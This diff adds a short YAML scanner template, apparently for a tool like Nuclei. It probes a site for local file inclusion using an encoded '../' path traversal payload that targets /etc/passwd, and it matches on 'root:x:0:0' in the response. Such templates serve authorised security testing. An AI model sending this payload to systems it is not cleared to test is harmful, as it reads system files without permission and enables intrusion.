@@ -1,0 +1,20 @@
+id: lfi6-0665
+name: 'Traversal in root'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via root'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      root:
+        - '..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
